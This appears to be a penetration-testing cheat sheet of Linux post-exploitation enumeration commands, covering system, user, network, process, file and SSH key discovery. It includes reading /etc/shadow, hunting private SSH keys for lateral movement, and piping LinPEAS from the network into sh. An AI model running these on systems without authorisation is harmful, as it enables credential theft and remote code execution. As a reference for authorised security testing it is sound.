title: linux-enum
html:
linux-enum

Post-exploitation enumeration after gaining initial access. Run these before privesc to understand the box.

System Info

hostname
uname -a
cat /etc/os-release
cat /proc/version
arch
lsb_release -a 2>/dev/null

Users and Groups

cat /etc/passwd                  # All users
cat /etc/passwd | grep -v nologin | grep -v false   # Real users
cat /etc/shadow 2>/dev/null      # Password hashes (need root or readable)
cat /etc/group                   # Group memberships
who                              # Currently logged in
w                                # Who + what they're doing
last                             # Login history
id                               # Current user context

Network

ip addr show
ip route
ss -tlnp                        # TCP listening
ss -ulnp                        # UDP listening
netstat -antup 2>/dev/null
cat /etc/hosts
cat /etc/resolv.conf
arp -a
cat /etc/iptables/rules.v4 2>/dev/null
iptables -L -n 2>/dev/null

Look for: internal-only services, dual-homed hosts (multiple NICs), DNS entries hinting at other hosts.

Processes

ps aux
ps aux | grep root               # Root processes specifically
ps -ef --forest                  # Process tree

pspy (monitor without root)

Upload and run to catch cron jobs and processes you can't see with ps:

./pspy64
# or
./pspy32

Watch for: scheduled tasks, scripts running as root, credential-passing in command args.

Interesting Files

# Writable files outside home/tmp
find / -writable -type f 2>/dev/null | grep -vE "^/(proc|sys|dev|tmp|home)"

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Recently modified files (last 10 min)
find / -mmin -10 -type f 2>/dev/null | grep -vE "^/(proc|sys|dev)"

# Config files with passwords
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name ".env" 2>/dev/null

# Backup files
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null

Installed Software

dpkg -l 2>/dev/null              # Debian/Ubuntu
rpm -qa 2>/dev/null              # RHEL/CentOS
pip list 2>/dev/null
pip3 list 2>/dev/null

Look for outdated versions with known CVEs.

SSH Keys

find / -name "authorized_keys" 2>/dev/null
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
ls -la ~/.ssh/
cat ~/.ssh/known_hosts           # Reveals other hosts this user connects to

Grab private keys for lateral movement. Check other users' home dirs too.

Automated Enumeration

# LinPEAS — comprehensive, color-coded output
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Exploit Suggester — kernel exploit matching
./linux-exploit-suggester.sh

# LinEnum
./LinEnum.sh -r report -e /tmp/ -t

Save output for offline review: ./linpeas.sh | tee linpeas_output.txt
